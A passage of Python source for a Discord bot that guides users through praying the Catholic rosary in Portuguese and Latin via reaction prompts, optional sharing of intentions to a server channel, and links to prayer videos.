_ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await oferecimento.add_reaction('✅')

    def prossegue_p_6(reaction, user):
        return user == message.author and str(reaction.emoji) == '✅' and reaction.message.id == oferecimento.id

    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_6)


    oferecimento2 = await message.channel.send(f'> **•  Pela pátria, para que fique livre dos males do comunismo, do liberalismo, do** {os.linesep} > **  protestantismo, do aborto e de todas as heresias** {os.linesep} > {os.linesep} > **•  Pelo chefe da nação e do estado, para que ele se converta; ou, se for da Vossa** {os.linesep} > **  santa vontade, ó Senhor, levai-o para que não cause mais escândalo** {os.linesep} > {os.linesep} > **•  Por todos que somos obrigados a rezar** {os.linesep} > {os.linesep} > **•  E pelas nossas intenções particulares.** {os.linesep} > **  (Demora-se aqui um instante para que cada um reze em sua alma.)** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await oferecimento2.add_reaction('✅')

    def prossegue_p_6_2(reaction, user):
        return user == message.author and str(reaction.emoji) == '✅' and reaction.message.id == oferecimento2.id

    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_6_2)


    decisao_relatorio = await message.channel.send(f'> ## Compartilhar? {os.linesep} > {os.linesep} > **Você deseja compartilhar suas intenções?**  {os.linesep} > *(elas ficarão no mural do servidor)* {os.linesep} > {os.linesep} > ✅  **SIM** {os.linesep} > {os.linesep} > ✅  **NÃO**  {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await decisao_relatorio.add_reaction('✅')
    await decisao_relatorio.add_reaction('❎')

    def prossegue_p_7(reaction, user):
        return user == message.author and str(reaction.emoji) in ['✅','❎'] and reaction.message.id == decisao_relatorio.id

    reaction4, use4 = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_7)
    print(repr(str(reaction4.emoji)))
  
    if str(reaction4.emoji) == '✅':

        print(repr(str(reaction4.emoji)))
        
        await message.channel.send(f'> ## Compartilhamento {os.linesep} > {os.linesep} > ** Digite suas inteções abaixo...** {os.linesep} > *(uma vez enviado não é possível cancelar)* {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')


        def check_intencoes(m):
            return m.author == message.author and m.channel == message.channel
        # Aqui quero pegar o conteudo das inteções e salvar na variável conteúdo abaixo

        intencoes_message = await bot.wait_for('message', timeout=600.0, check=check_intencoes)

        conteudo = intencoes_message.content  # Obtém o conteúdo da mensagem
        
        canal_destino_id = 1263608547371913310

        canal_destino = bot.get_channel(canal_destino_id)
      
        if canal_destino:
            # Envia a mensagem para o canal específico
            await canal_destino.send(f'## Intenções de {user} {os.linesep} {conteudo}`')
        else:
            print(f"Canal destino com ID {canal_destino_id} não encontrado.")

        # await intencoes_message.canal_destino_id.send("teste")
        await bot.process_commands(message)

    elif str(reaction4.emoji) == '❎':
        print(repr(str(reaction4.emoji)))
        print("Wrong button")

    oferecimento3 = await message.channel.send(f'## Oferecimento {os.linesep} >  **Nós Vos oferecemos, Trindade Santíssima, este Credo, para honrar os mistérios** {os.linesep} >  **todos de nossa Fé; este Padre-Nosso e estas três Ave-Marias para honrar a unidade** {os.linesep} >  **de Vossa essência e a trindade de Vossas Pessoas. Pedimos-Vos uma fé viva, uma** {os.linesep} >  **esperança firme e uma caridade ardente.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

    await oferecimento3.add_reaction('✅')
    

    def prossegue_p_8(reaction, user):
        return user == message.author and str(reaction.emoji) in ['✅'] and reaction.message.id == oferecimento3.id
    
    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_8)
    
    creio = await message.channel.send(f'## Credo {os.linesep} >  ** Creio em Deus Padre, todo-poderoso,** {os.linesep} > *(Rezar o Credo, segurando a cruz do Rosário:)* {os.linesep} > {os.linesep} > ** Criador do Céu e da terra. E em Jesus** {os.linesep} >  ** Cristo, um só Seu Filho, Nosso Senhor;** {os.linesep} >  ** O qual foi concebido pelo poder do** {os.linesep} > ** Espírito Santo, nasceu de Maria ** {os.linesep} > ** Virgem; padeceu sob o poder de** {os.linesep} > ** Pôncio Pilatos, foi crucificado, morto e** {os.linesep} > ** sepultado; desceu aos infernos, ao ** {os.linesep} > ** terceiro dia ressurgiu dos mortos; subiu** {os.linesep} > ** aos Céus, está sentado à mão direita ** {os.linesep} > ** de Deus Padre todo-poderoso; de onde** {os.linesep} > ** há de vir a julgar os vivos e os mortos.** {os.linesep} > ** Creio no Espírito Santo; na Santa Igreja** {os.linesep} > **Católica, na comunhão dos Santos; na** {os.linesep} > **remissão dos pecados; na ressureição** {os.linesep} > **da carne; na vida eterna. Amém.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

    await creio.add_reaction('✅')
    

    def prossegue_p_9(reaction, user):
        return user == message.author and str(reaction.emoji) in ['✅'] and reaction.message.id == creio.id
    
    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_9)

    pai_nosso_p = await message.channel.send(f'## Pai Nosso {os.linesep} > *(segurando a conta grande logo após a cruz:)* {os.linesep} > {os.linesep} > ** ℣. Padre nosso, que estais nos Céus,** {os.linesep} >  ** santificado seja o Vosso Nome. Venha a** {os.linesep} >  ** nós o Vosso Reino. Seja feita a Vossa** {os.linesep} >  ** vontade, assim na terra como no Céu.** {os.linesep} >  {os.linesep} > ** ℟. O pão nosso de cada dia nos dai hoje.** {os.linesep} > ** Perdoai-nos as nossas dívidas, assim** {os.linesep} > ** como nós perdoamos aos nossos** {os.linesep} > ** devedores. E não nos deixeis cair em** {os.linesep} > ** tentação. Mas livrai-nos do Mal. Amém.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

    await pai_nosso_p.add_reaction('✅')
    

    def prossegue_p_10(reaction, user):
        return user == message.author and str(reaction.emoji) in ['✅'] and reaction.message.id == pai_nosso_p.id
    
    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_10)

    vezes = 3
    await ave_maria(message, vezes)


    gloria = await message.channel.send(f'## Glória ao Padre {os.linesep} > ** ℣. Glória ao Padre, ao Filho e ao Espírito ** {os.linesep} >  ** Santo.** {os.linesep} > {os.linesep} > ** ℟. Assim como era no princípio, agora e ** {os.linesep} >  ** sempre, e por todos os séculos dos** {os.linesep} > ** séculos. Amém.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

    await gloria.add_reaction('✅')
    

    def prossegue_p_12(reaction, user):
        return user == message.author and str(reaction.emoji) in ['✅'] and reaction.message.id == gloria.id
    
    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_12)


    async def completaDezena(message, info1, info2):
        pai_nosso_p = await message.channel.send(f'## Pai Nosso {os.linesep} > *(segurando a conta grande logo após a cruz:)* {os.linesep} > {os.linesep} > ** ℣. Padre nosso, que estais nos Céus,** {os.linesep} >  ** santificado seja o Vosso Nome. Venha a** {os.linesep} >  ** nós o Vosso Reino. Seja feita a Vossa** {os.linesep} >  ** vontade, assim na terra como no Céu.** {os.linesep} >  {os.linesep} > ** ℟. O pão nosso de cada dia nos dai hoje.** {os.linesep} > ** Perdoai-nos as nossas dívidas, assim** {os.linesep} > ** como nós perdoamos aos nossos** {os.linesep} > ** devedores. E não nos deixeis cair em** {os.linesep} > ** tentação. Mas livrai-nos do Mal. Amém.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

        await pai_nosso_p.add_reaction('✅')
    

        def prossegue_p_10(reaction, user):
            return user == message.author and str(reaction.emoji) in ['✅'] and reaction.message.id == pai_nosso_p.id
    
        reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_10)

        vezes = 10
        await ave_maria(message, vezes)


        meditando_misterio = await message.channel.send(f'## {info1} {os.linesep} > {os.linesep} > ** Mistério {info2}** {os.linesep} > {os.linesep} > **{misterios[misterio_p][info2]}** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

        await meditando_misterio.add_reaction('✅')
    

        def prossegue_meditando(reaction, user):
            return user == message.author and str(reaction.emoji) in ['✅'] and reaction.message.id == meditando_misterio.id

        reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_meditando)


        gloria = await message.channel.send(f'## Glória ao Padre {os.linesep} > ** ℣. Glória ao Padre, ao Filho e ao Espírito ** {os.linesep} >  ** Santo.** {os.linesep} > {os.linesep} > ** ℟. Assim como era no princípio, agora e ** {os.linesep} >  ** sempre, e por todos os séculos dos** {os.linesep} > ** séculos. Amém.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

        await gloria.add_reaction('✅')
    

        def prossegue_p_12(reaction, user):
            return user == message.author and str(reaction.emoji) in ['✅'] and reaction.message.id == gloria.id
    
        reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_12)

        oracao_fatima = await message.channel.send(f'## Oração de Fátima {os.linesep} > ** Ó meu Jesus, perdoai-nos, livrai-nos do fogo do Inferno; levai as almas todas para o** {os.linesep} >  ** Céu, principalmente as que mais precisarem.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

        await oracao_fatima.add_reaction('✅')
    
        def prossegue_p_fatima(reaction, user):
            return user == message.author and str(reaction.emoji) in ['✅'] and reaction.message.id == oracao_fatima.id
    
        reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_fatima)



    info2 = 1
    await completaDezena(message, misterio_p, info2)    

    info2 = 2
    await completaDezena(message, misterio_p, info2)

    info2 = 3
    await completaDezena(message, misterio_p, info2)

    info2 = 4
    await completaDezena(message, misterio_p, info2)

    info2 = 5
    await completaDezena(message, misterio_p, info2)


    agradecimentos = await message.channel.send(f'## Agradecimentos {os.linesep} > {os.linesep} > ** Infinitas graças vos damos, soberana Rainha, pelos benefícios que todos os dias recebemos de vossas mãos liberais. Dignai-vos, agora e para sempre, tomar-nos debaixo do vosso poderoso amparo e, para mais vos obrigar, vos saudamos com uma Salve-Rainha. ** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

    await agradecimentos.add_reaction('✅')
    

    def prossegue_p_agradecimentos(reaction, user):
        return user == message.author and str(reaction.emoji) in ['✅'] and reaction.message.id == agradecimentos.id
    
    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_agradecimentos)


    salve_rainha = await message.channel.send(f'## Salve rainha {os.linesep} > {os.linesep} > ** Salve, Rainha, Mãe de misericórdia, vida, doçura e esperança nossa, salve! A vós bradamos, os degredados filhos de Eva. A vós suspiramos, gemendo e chorando, neste vale de lágrimas. Eia, pois, a advogada nossa; estes vossos olhos misericordiosos a nós volvei. E depois deste desterro, mostrai-nos Jesus, bendito fruto do vosso ventre. Ó clemente, ó piedosa, ó doce sempre Virgem Maria!** {os.linesep} > {os.linesep} > **℣. Rogai por nós, Santa Mãe de Deus** {os.linesep} > **℟. Para que sejamos dignos das** {os.linesep} > **promessas de Cristo.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

    await salve_rainha.add_reaction('✅')
    

    def prossegue_p_salve_rainha(reaction, user):
        return user == message.author and str(reaction.emoji) in ['✅'] and reaction.message.id == salve_rainha.id
    
    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_salve_rainha)

    

    sao_miguel_arcanjo = await message.channel.send(f'## São Miguel Arcanjo {os.linesep} > {os.linesep} > ** São Miguel Arcanjo, defendei-nos no combate; cobri-nos com o vosso escudo contra os embustes e as ciladas do demônio. Subjugue-o Deus, instantemente vos pedimos; e vós, príncipe da milícia celeste, pelo divino poder, precipitai no Inferno a Satanás e aos outros espíritos malignos, que andam pelo mundo para perder as almas. Amém. ** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

    await sao_miguel_arcanjo.add_reaction('✅')
    

    def prossegue_p_miguel_arcanjo(reaction, user):
        return user == message.author and str(reaction.emoji) in ['✅'] and reaction.message.id == sao_miguel_arcanjo.id
    
    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_miguel_arcanjo)


    concluido = await message.channel.send(f'## Concluido! {os.linesep} > {os.linesep} > ** Você concluiu o rosário! ** {os.linesep} > **deseja compartilhar a conclusão?** {os.linesep} > ✅ **SIM** {os.linesep} > ❎ **NÃO** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

    await concluido.add_reaction('✅')
    await concluido.add_reaction('❎')
    

    def prossegue_p_concluido(reaction, user):
        return user == message.author and str(reaction.emoji) in ['✅', '❎'] and reaction.message.id == concluido.id
    
    reactionconclusion, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_concluido)

    if str(reactionconclusion.emoji) == '✅':
        canal_destino_id_conclusion = 1263608547371913310

        canal_destino = bot.get_channel(canal_destino_id)
        
        if canal_destino:
            await canal_destino.send(f'## {user} concluiu rosário!`')
        else:
            print(f"Canal destino com ID {canal_destino_id_conclusion} não encontrado.")

        await bot.process_commands(message)

    elif str(reactionconclusion.emoji) == '❎':
        print("Que Deus te abençoe")



async def rosario_latim(message):    
    resposta3_p = await message.channel.send(f'## Escolha um mistério: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _  {os.linesep} >   🔵    **MISTÉRIOS GOZOSOS** {os.linesep} > {os.linesep} >   🟡    **MISTÉRIOS LUMINOSOS** {os.linesep} > {os.linesep} >   🔴    **MISTÉRIOS DOLOROSOS** {os.linesep} > {os.linesep} >   🟤    **MISTÉRIOS GLORIOSOS** {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await resposta3_p.add_reaction('🔵')
    await resposta3_p.add_reaction('🟡')
    await resposta3_p.add_reaction('🔴')
    await resposta3_p.add_reaction('🟤')

    def check_misterio_p(reaction, user):
        return user == message.author and str(reaction.emoji) in ['🔵', '🟡', '🔴', '🟤'] and reaction.message.id == resposta3_p.id

    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=check_misterio_p)

    misterio_p = "null"
    if str(reaction.emoji) == '🔵':
        misterio_p = "Mistérios gozosos"
    elif str(reaction.emoji) == '🟡':
        misterio_p = "Mistérios luminosos"
    elif str(reaction.emoji) == '🔴':
        misterio_p = "Mistérios dolorosos"
    elif str(reaction.emoji) == '🟤':  
        misterio_p = "Mistérios gloriosos"

    
    sinalcruz = await message.channel.send(f'## Fazer sinal da Cruz: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _  {os.linesep} > **✠ Per signum Crucis, ✠ líbera nos,** {os.linesep} > {os.linesep} > **Deus, Dóminum nostrum, ✠ de inimícis** {os.linesep} > **nostris.** {os.linesep} > {os.linesep} > **In nómine Patris, ✠ et Fílii, et Spíritus** {os.linesep} > **Sancti. Ámen.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await sinalcruz.add_reaction('✅')
    await sinalcruz.add_reaction('🎥')
    
    while(True):
        def prossegue_p_1(reaction, user):
            return user == message.author and str(reaction.emoji) in ['🎥', '✅'] and reaction.message.id == sinalcruz.id

        reaction_1, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_1)

        
        if str(reaction_1.emoji) == "🎥":
            await message.channel.send('https://www.youtube.com/watch?v=-HH0YBQRel0&ab_channel=Ora%C3%A7%C3%B5esEmLatim') 
            continue
        elif str(reaction_1.emoji) == "✅":
            break

    sao_jose_p = await message.channel.send(f'## Colocar-se na presença de Deus, recorrendo a São José: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _  {os.linesep} > **Senhor, quem sou eu para me atrever a comparecer diante de Vossa presença?** {os.linesep} > **Conheço a deficiência de meus méritos e a multidão de meus pecados, pelos quais** {os.linesep} > **não mereço ser ouvido em minhas orações, mas o que não mereço, merece-o o pai** {os.linesep} > **nutrício de Jesus; o que não posso, ele pode. Venho, portanto, com toda a confiança,** {os.linesep} > **implorar a divina clemência, não fiado em minha fraqueza, mas no poder e** {os.linesep} > **validamento de São José.** {os.linesep} > {os.linesep} > **Jesus, que por uma inefável providência dignastes-Vos escolher o bem-aventurado** {os.linesep} > **esposo de Vossa Mãe Santíssima, concedei-nos que aquele mesmo que veneramos** {os.linesep} > **como protetor, mereçamos tê-lo no Céu por nosso intercessor. Vós que viveis e reinais** {os.linesep} > **por todos os séculos dos séculos. Amém.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await sao_jose_p.add_reaction('✅')



    def prossegue_p_2(reaction, user):
        return user == message.author and str(reaction.emoji) == '✅' and reaction.message.id == sao_jose_p.id

    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_2)
    

    espirito_santo = await message.channel.send(f'## Vinde, Espírito Santo {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _  {os.linesep} > **Veni, Sancte Spíritus, reple tuórum corda** {os.linesep} > **fidélium et tui amóris in eis ignem** {os.linesep} > **accénde** {os.linesep} > **℣. Emítte Spíritum tuum et creabúntur.** {os.linesep} > {os.linesep} > **℟. Et renovábis fáciem terræ.** {os.linesep} > {os.linesep} > **Orémus: Deus, qui corda fidélium Sancti** {os.linesep} > **Spíritus illustratióne docuísti: da nobis in** {os.linesep} > **eódem Spíritu recta sápere; et de eius** {os.linesep} > **semper consolatióne gaudére. Per** {os.linesep} > **Christum Dóminum nostrum. Ámen.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await espirito_santo.add_reaction('✅')
    await espirito_santo.add_reaction('🎥')

    while(True):
        def prossegue_p_3(reaction, user):
            return user == message.author and str(reaction.emoji) in ['✅', '🎥'] and reaction.message.id == espirito_santo.id

        reaction_2, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_3)

        if str(reaction_2.emoji) == "🎥":
            await message.channel.send('https://www.youtube.com/watch?v=VRbTymlKruo') 
            continue
        elif str(reaction_2.emoji) == "✅":
            break

    contricao = await message.channel.send(f'## Ato de Contrição {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _  {os.linesep} > **Senhor meu Jesus Cristo, Deus e Homem verdadeiro, Criador e Redentor meu, por** {os.linesep} > **serdes Vós quem sois, sumamente bom e digno de ser amado sobre todas as coisas,** {os.linesep} > **e porque Vos amo e estimo, pesa-me, Senhor, de todo o meu coração, por Vos ter** {os.linesep} > **ofendido; pesa-me também por ter perdido o Céu e merecido o Inferno. E proponho** {os.linesep} > **firmemente, ajudado com o auxílio da Vossa divina graça, emendar-me e nunca mais** {os.linesep} > **Vos tornar a ofender. Espero alcançar o perdão de minhas culpas, pela Vossa infinita** {os.linesep} > **misericórdia. Amém.**{os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await contricao.add_reaction('✅')

    def prossegue_p_4(reaction, user):
        return user == message.author and str(reaction.emoji) == '✅' and reaction.message.id == contricao.id

    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_4)

    santissima = await message.channel.send(f'## Pedir à Santíssima Virgem permissão e graça para louvá-la: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _  {os.linesep} > **℣. Dignáre me laudáre te, Virgo sacráta.** {os.linesep} > **sagrada Virgem.** {os.linesep} > {os.linesep} > **℟. Da mihi virtútem contra hostes tuos.** {os.linesep} > **inimigos.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await santissima.add_reaction('✅')

    def prossegue_p_5(reaction, user):
        return user == message.author and str(reaction.emoji) == '✅' and reaction.message.id == santissima.id

    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_5)


    #
    oferecimento = await message.channel.send(f'## Fazer o oferecimento do Santo Rosário: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _  {os.linesep} > **Uno-me a todos os Santos que estão no céu, a todos os justos que estão sobre a** {os.linesep} > **terra, a todas as almas fiéis que estão neste lugar. Uno-me a Vós, meu Jesus, para** {os.linesep} > **louvar dignamente Vossa Santa Mãe e louvar-Vos a Vós, n’Ela e por Ela. Renuncio a** {os.linesep} > **todas as distrações que me sobrevierem durante este Rosário, que quero recitar com** {os.linesep} > **modéstia, atenção e devoção, como se fosse o último de minha vida. Assim seja.** {os.linesep} > {os.linesep} > **Nós Vos oferecemos, Senhor Jesus, este Santo Rosário nas seguintes intenções:** {os.linesep} > {os.linesep} > **•  Em ato de desagravo pelas ofensas dirigidas contra o Vosso Sagrado Coração** {os.linesep} > **e contra o Imaculado Coração de Maria** {os.linesep} > {os.linesep} > **•  Pelo bom sacerdócio de todos os sacerdotes em nossa pátria** {os.linesep} > {os.linesep} > **•  Pelo bom episcopado de Dom Rodrigo da Silva**  {os.linesep} > {os.linesep} > **•  Pelas vocações religiosas e sacerdotais em nossa pátria**  {os.linesep} > {os.linesep} > **•  Por todos os seminários, pela perseverança dos seminaristas a caminho do** {os.linesep} > **  sacerdócio e pelo progresso das missões** {os.linesep} > {os.linesep} > **•  Pelo alívio das almas do Purgatório** {os.linesep} > {os.linesep} > **•  Pela santificação deste dia** {os.linesep} > {os.linesep} > **•  Pelas intenções do Romano Pontífice** {os.linesep} > {os.linesep} > **•  Pela ruína dos vícios e imoralidades** {os.linesep} > {os.linesep} > **•  Pela conversão dos pecadores, dos pagãos e de nossas famílias** {os.linesep} > {os.linesep} > **• Pelas graças necessárias para nossa salvação** {os.linesep} > {os.linesep} > **•  Pelo aumento do nosso fervor** {os.linesep} > {os.linesep} > **•  Para que tenhamos horror e ódio ao pecado** {os.linesep} > {os.linesep} > **•  Para que todos os fiéis tomem ciência da Apostasia reinante** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await oferecimento.add_reaction('✅')

    def prossegue_p_6(reaction, user):
        return user == message.author and str(reaction.emoji) == '✅' and reaction.message.id == oferecimento.id

    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_6)


    oferecimento2 = await message.channel.send(f'> **•  Pela pátria, para que fique livre dos males do comunismo, do liberalismo, do** {os.linesep} > **  protestantismo, do aborto e de todas as heresias** {os.linesep} > {os.linesep} > **•  Pelo chefe da nação e do estado, para que ele se converta; ou, se for da Vossa** {os.linesep} > **  santa vontade, ó Senhor, levai-o para que não cause mais escândalo** {os.linesep} > {os.linesep} > **•  Por todos que somos obrigados a rezar** {os.linesep} > {os.linesep} > **•  E pelas nossas intenções particulares.** {os.linesep} > **  (Demora-se aqui um instante para que cada um reze em sua alma.)** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await oferecimento2.add_reaction('✅')

    def prossegue_p_6_2(reaction, user):
        return user == message.author and str(reaction.emoji) == '✅' and reaction.message.id == oferecimento2.id

    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_6_2)


    decisao_relatorio = await message.channel.send(f'> ## Compartilhar? {os.linesep} > {os.linesep} > **Você deseja compartilhar suas intenções?**  {os.linesep} > *(elas ficarão no mural do servidor)* {os.linesep} > {os.linesep} > ✅  **SIM** {os.linesep} > {os.linesep} > ✅  **NÃO**  {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await decisao_relatorio.add_reaction('✅')
    await decisao_relatorio.add_reaction('❎')

    def prossegue_p_7(reaction, user):
        return user == message.author and str(reaction.emoji) in ['✅','❎'] and reaction.message.id == decisao_relatorio.id

    reaction4, use4 = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_7)
    print(repr(str(reaction4.emoji)))
    # Esse if tem algum problema    
    if str(reaction4.emoji) == '✅':

        print(repr(str(reaction4.emoji)))
        
        await message.channel.send(f'> ## Compartilhamento {os.linesep} > {os.linesep} > ** Digite suas inteções abaixo...** {os.linesep} > *(uma vez enviado não é possível cancelar)* {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')


        def check_intencoes(m):
            return m.author == message.author and m.channel == message.channel

        intencoes_message = await bot.wait_for('message', timeout=600.0, check=check_intencoes)

        conteudo = intencoes_message.content  
        
        print(conteudo)
        
        canal_destino_id = 1264081174372810834

        canal_destino = bot.get_channel(canal_destino_id)
     
        if canal_destino:
            await canal_destino.send(f'## Intenções de {user} {os.linesep} {conteudo}`')
        else:
            print(f"Canal destino com ID {canal_destino_id} não encontrado.")

        await bot.process_commands(message)

    elif str(reaction4.emoji) == '❎':
        print(repr(str(reaction4.emoji)))
        print("Wrong button")

    oferecimento3 = await message.channel.send(f'## Oferecimento {os.linesep} >  **Nós Vos oferecemos, Trindade Santíssima, este Credo, para honrar os mistérios** {os.linesep} >  **todos de nossa Fé; este Padre-Nosso e estas três Ave-Marias para honrar a unidade** {os.linesep} >  **de Vossa essência e a trindade de Vossas Pessoas. Pedimos-Vos uma fé viva, uma** {os.linesep} >  **esperança firme e uma caridade ardente.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

    await oferecimento3.add_reaction('✅')
    

    def prossegue_p_8(reaction, user):
        return user == message.author and str(reaction.emoji) in ['✅'] and reaction.message.id == oferecimento3.id
    
    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_8)

        
    creio = await message.channel.send(f'## Credo {os.linesep} > **Credo in Deum, Patrem omnipoténtem, Creatórem cæli et terræ. Et in Iesum Christum, Fílium eius únicum, Dóminum nostrum; qui concéptus est de Spíritu Sancto, natus ex María Vírgine; passussub Pontio Piláto, crucifíxus, mórtuus et sepúltus; descéndit ad ínferos, tértia die ressuréxit a mórtuis; ascéndit ad cælos, sedet ad déxteram Dei Patris omnipoténtis; inde ventúrus est iudicáre vivos et mórtuos. Credo in Spíritum Sanctum; Sanctam Ecclésiam Cathólicam, Sanctórum communiónem; remissiónem peccatórum; carnis ressurectiónem; vitam ætérnam. Ámen.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

    await creio.add_reaction('✅')
    await creio.add_reaction('🎥')

    while(True):
        def prossegue_p_9(reaction, user):
            return user == message.author and str(reaction.emoji) in ['✅', '🎥'] and reaction.message.id == creio.id
        
        reaction_3, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_9)

        if str(reaction_3.emoji) == "🎥":
            await message.channel.send('https://www.youtube.com/watch?v=B6Y84PKL_JE&t=1s') 
            continue
        elif str(reaction_3.emoji) == "✅":
            break


    pai_nosso_p = await message.channel.send(f'## Pai Nosso {os.linesep} > {os.linesep} > ** ℣. Pater noster, qui es in cælis, sanctificétur nomen tuum. Advéniat regnum tuum. Fiat volúntas tua, sicut in cælo et in terra. ** {os.linesep} > {os.linesep} > ** ℟. Panem nostrum quotidiánum da nobis hódie. Et dimítte nobis débita nostra, sicut et nos dimíttimus debitóribus nostris. Et ne nos indúcas in tentatiónem. Sed líbera nos a malo. Ámen. ** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

    await pai_nosso_p.add_reaction('✅')
    await pai_nosso_p.add_reaction('🎥')

    while(True):
        def prossegue_p_10(reaction, user):
            return user == message.author and str(reaction.emoji) in ['✅', '🎥'] and reaction.message.id == pai_nosso_p.id
        
        reaction_4, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_10)

        if str(reaction_4.emoji) == "🎥":
            await message.channel.send('https://www.youtube.com/watch?v=kp7wNDZ6nhM') 
            continue
        elif str(reaction_4.emoji) == "✅":
            break

    
    vezes = 3
    await ave_maria_latim(message, vezes)


    gloria = await message.channel.send(f'## Glória ao Padre {os.linesep} > ** ℣. Glória Patri, et Fílio et Spíritui Sancto. ** {os.linesep} > ** ℟. Sicut érat in princípio, et nunc et ** {os.linesep} > ** semper, et in sǽcula sæculórum. Ámen. ** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')

    await gloria.add_reaction('✅')
    await gloria.add_reaction('🎥')
    
    while(True):
        def prossegue_p_12(reaction, user):
            return user == message.author and str(reaction.emoji) in ['✅', '🎥'] and reaction.message.id == gloria.id
        

        reaction_5, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_12)
    
        if str(reaction_5.emoji) == "🎥":
            await message.channel.send('https://www.youtube.com/watch?v=OXCXKmsZZPw') 
            continue
        elif str(reaction_5.emoji) == "✅":
            break

    async def completaDezena(message, info1, info2):
